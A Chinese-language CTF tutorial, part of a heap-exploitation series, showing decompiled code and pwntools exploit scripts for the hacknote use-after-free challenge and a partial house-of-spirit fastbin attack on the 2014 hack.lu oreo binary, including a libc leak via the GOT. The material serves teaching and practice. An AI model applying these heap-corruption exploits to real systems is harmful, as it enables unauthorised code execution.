# pwn堆入门系列教程5
[pwn堆入门系列教程1](https://xz.aliyun.com/t/6087)  
[pwn堆入门系列教程2](https://xz.aliyun.com/t/6169)  
[pwn堆入门系列教程3](https://xz.aliyun.com/t/6252)  
[pwn堆入门系列教程4](https://xz.aliyun.com/t/6322)
进入uaf学习了，这部分题目就一道题
## hitcon-training-hacknote
这道题其实很简单，不过要冷静下才能做，我当时有点急躁，浪费一个钟才搞出来？冷静下来10分钟懂了
### 漏洞点
    unsigned int del_note()
    {
      int v1; // [esp+4h] [ebp-14h]
      char buf; // [esp+8h] [ebp-10h]
      unsigned int v3; // [esp+Ch] [ebp-Ch]
      v3 = __readgsdword(0x14u);
      printf("Index :");
      read(0, &buf, 4u);
      v1 = atoi(&buf);
      if ( v1 = count )
      {
        puts("Out of bound!");
        _exit(0);
      }
      if ( notelist[v1] )
      {
        free(*(notelist[v1] + 1));
        free(notelist[v1]);
        puts("Success");
      }
      return __readgsdword(0x14u) ^ v3;
    }
### 漏洞利用过程
具体分析不讲了，ctf-wiki上讲的很清楚， 我大致讲一下就是要利用要覆盖到他的content指针，这样的话print的时候会调用到另一个函数
### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from PwnContext.core import *
    local = True
    # Set up pwntools for the correct architecture
    exe = './' + 'hacknote'
    elf = context.binary = ELF(exe)
    #don't forget to change it
    host = '127.0.0.1'
    port = 10000
    #don't forget to change it
    #ctx.binary = './' + 'hacknote'
    ctx.binary = exe
    libc = elf.libc
    ctx.debug_remote_libc = False
    ctx.remote_libc = libc
    if local:
        context.log_level = 'debug'
        io = ctx.start()
    else:
        io = remote(host,port)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     i386-32-little
    # RELRO:    Partial RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x8048000)
    def add(size, content):
        io.sendlineafter("Your choice :", "1")
        io.sendlineafter("Note size :", str(size))
        io.sendlineafter("Content :", content)
    def delete(idx):
        io.sendlineafter("Your choice :", "2")
        io.sendlineafter("Index :", str(idx))
    def Print(idx):
        io.sendlineafter("Your choice :", "3")
        io.sendlineafter("Index :", str(idx))
    def Exit():
        io.sendlineafter("Your choice :", "4")
    def exp():
        ptr = 0x08048986
        add(0x20, 'aaaa')
        add(0x20, 'bbbb')
        delete(0)
        delete(1)
        add(0x8, p32(ptr))
        Print(0)
    if __name__ == '__main__':
        exp()
        io.interactive()
接下来进入fastbin attack,fastbin attack有三个题目
## 2014 hack.lu oreo
补充函数说明：
  * fgets函数会在输入完成后自动在结尾添加一个'\0'，比如我们输入1234加上我们的回车总共是1234'\x0a''\x00'他sub_80485EC这个函数会将\x0a变成\x00  
### 结构体构造
开头调试的时候一直不理解他的结构体是如何构造出来的，然后ida解析出来的跟他图片上所谓结构体格格不入，所以手动调试了一下午，知道了他的结构体是如何构造的
    struct gum
    {
        char decription[25];
        char name[27];
        struct *next;
    }
这个结构体是经过调试以及看汇编得出来的，
    unsigned int sub_8048644()
    {
      char *v1; // [esp+18h] [ebp-10h]
      unsigned int v2; // [esp+1Ch] [ebp-Ch]
      v2 = __readgsdword(0x14u);
      v1 = dword_804A288;
      dword_804A288 = (char *)malloc(0x38u);
      if ( dword_804A288 )
      {
        *((_DWORD *)dword_804A288 + 13) = v1;
        printf("Rifle name: ");
        fgets(dword_804A288 + 25, 56, stdin);
        sub_80485EC(dword_804A288 + 25);
        printf("Rifle description: ");
        fgets(dword_804A288, 56, stdin);
        sub_80485EC(dword_804A288);
        ++dword_804A2A4;
      }
      else
      {
        puts("Something terrible happened!");
      }
      return __readgsdword(0x14u) ^ v2;
    }
这里可以看出filename从25开始的，推出前面的description为25，而name长度为27是如何推出来的呢？看图  
我这是在输出函数
    unsigned int sub_8048729()
    {
      char *i; // [esp+14h] [ebp-14h]
      unsigned int v2; // [esp+1Ch] [ebp-Ch]
      v2 = __readgsdword(0x14u);
      printf("Rifle to be ordered:\n%s\n", "===================================");
      for ( i = dword_804A288; i; i = (char *)*((_DWORD *)i + 13) )
      {
        printf("Name: %s\n", i + 25);
        printf("Description: %s\n", i);
        puts("===================================");
      }
      return __readgsdword(0x14u) ^ v2;
    }
这里下的断点，你看ida解析出来的什么鬼，i+13，莫名奇妙的写法，完全看不懂，然后我定位到这里断点后，他加的值是0x34，他是从结构体开头加的0x34(10进制:52)，然后取出下一个指针，也就是next指针，继续进行循环，ida解析出的i+13完全乱来的，52-25
= 27，所以大小就这么退出来了，不理解这个结构体，这道题很多写法都看不懂，比如他的偏移什么，理解了就好构造了。
### 整体思路
题目里有堆溢出，我们可以通过堆溢出溢出到结构体的next指针，让next指针指向got表某一项，从而泄露出地址，进而求出libc的地址，求出libc的地址过后，在利用house
of sprit，free掉一个自己伪造的chunk,进而达到覆写got表成one_gadget，然后通过调用该函数获得权限
### 初始化函数
将堆的各个操作写成函数，因为堆里有很多重复操作，所以这样会比较方便
    def add(name, description):
        p.sendline("1")
        p.sendline(name)
        p.sendline(description)
    def show():
        p.sendline("2")
        p.recvuntil("===================================")
    def delete():
        p.sendline("3")
    def edit(payload):
        p.sendline("4")
        p.sendline(payload)
    def puts():
        p.sendline("5")
### leak地址
我们知道他有个next指针，所以我们覆盖掉他的next指针，在利用show函数就可以打印任意地址的内容了
    #first leak the libc
        puts_got = elf.got['puts']
        payload = 'a'*27 + p32(puts_got)
        add(payload, 'a'*25)
        show()
        p.recvuntil("===================================")
        p.recvuntil("Description: ")
        result = p.recvuntil("===================================")[:4]
        puts_addr = u32(result)
        log.success("puts_got = {:#x}".format(puts_addr))
        libc_base = puts_addr - libc.symbols['puts']
        sys_addr = libc_base + libc.symbols['system']
        bin_sh = libc_base + libc.search('/bin/sh').next()
这样就leak出puts的地址，接着就可以获得libc地址
### 填充大小并修改next指针
这题目有个计算数值的变量，也就是说你malloc一个，他就会加1，我们可以将这里当作chunk大小，因为一个枪支结构体大小为0x38,所以堆块大小为0x40,我们将其大小提升至0x40，并让最后一个堆块的next指针指向这块
    i = 1
        while i < 0x3f:
            add('a'*27 + p32(0), 'b'*25)
            i += 1
        payload = 'a'*27 + p32(0x804A2A8)
        add(payload, 'a'*25)
0x804a2a4是count的地址，所以+4就是堆块的数据段
### 绕过检测
  1. 对齐检查  
在此处的检查中，要求堆块具有16bytes对齐，所以chunk header的起始地址应为0x**0的形式。
  2. fake chunk 的size大小检查  
按照上文中chunk的结构布局，使当前fake chunk的size为合适的大小，能够充足利用并且加入fastbin(0x10-0x80)，
  3. next chunk 的size大小检查  
除了当前chunk的大小，与目标地址物理相邻的内存空间也应按照堆块的结构将size位置改写为能够加入fastbin的合适的大小的数值。
  4. 标记位检查
This chunk.size of this region has to be 16 more than the region (to
accomodate the chunk data) while still falling into the fastbin category (<=
128 on x64). The PREVINUSE (lsb) bit is ignored by free for fastbin-sized
chunks, however the IS _MMAPPED_ (second lsb) and _NON_MAIN_ARENA (third lsb)
bits cause problems…. note that this has to be the size of the next malloc
request rounded to the internal size used by the malloc implementation. E.g.
on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the
malloc parameter at the end.
    ### begin fake 
        payload = p8(0)*0x20 + p32(0x40) + p32(0x100)
        payload = payload.ljust(0x34, 'b')
        payload += p32(0)
        payload = payload.ljust(0x80, 'c')
        edit(payload)
        delete()
        p.recvuntil('Okay order submitted!\n')